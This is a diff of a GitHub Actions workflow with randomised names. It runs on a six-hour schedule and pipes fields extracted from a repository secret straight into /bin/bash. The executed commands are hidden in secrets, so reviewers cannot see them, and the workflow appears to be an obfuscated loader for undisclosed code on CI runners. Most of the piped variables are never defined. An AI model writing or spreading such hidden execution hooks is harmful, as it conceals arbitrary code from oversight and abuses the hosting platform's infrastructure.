@@ -1,32 +1,24 @@
 name: weidiyi9182
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 2/6 * * *'
+    - cron: '44 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: weidiyi9182
         env:
-          oag6907: ${{ secrets.oag6907 }}
+          go05219: ${{ secrets.go05219 }}
         run: |
-          echo $oag6907 | jq -r .m33 | /bin/bash
-          echo $ucutc58 | jq -r .wc262 | /bin/bash
-          echo $sf23815 | jq -r .ddpd7 | /bin/bash
-          echo $aftev347 | jq -r .ajyhu99 | /bin/bash
-          echo $racsb671 | jq -r .azvw91 | /bin/bash
-          echo $suqi7709 | jq -r .vvcr52964 | /bin/bash
-          echo $kfeo811 | jq -r .waps1782 | /bin/bash
-          echo $gyot061 | jq -r .qysyd0098 | /bin/bash
-          echo $b60 | jq -r .re29927 | /bin/bash
-          echo $ljhr274 | jq -r .fxct88873 | /bin/bash
-          echo $teybl51 | jq -r .j25 | /bin/bash
-          echo $mehf5 | jq -r .minr42 | /bin/bash
-          echo $sdti68823 | jq -r .sxsm1 | /bin/bash
-          echo $ntb1693 | jq -r .y35 | /bin/bash
-          echo $fmqb24 | jq -r .vmop07 | /bin/bash
-          echo $whk790 | jq -r .gpimr536 | /bin/bash
+          echo $go05219 | jq -r .egc638 | /bin/bash
+          echo $jkyes5795 | jq -r .a86955 | /bin/bash
+          echo $ke61106 | jq -r .qhhi381 | /bin/bash
+          echo $tl6342 | jq -r .n673 | /bin/bash
+          echo $qshx8 | jq -r .cm02 | /bin/bash
+          echo $bbqxo7632 | jq -r .hz3152 | /bin/bash
+          echo $kfuu2068 | jq -r .bj12 | /bin/bash
 
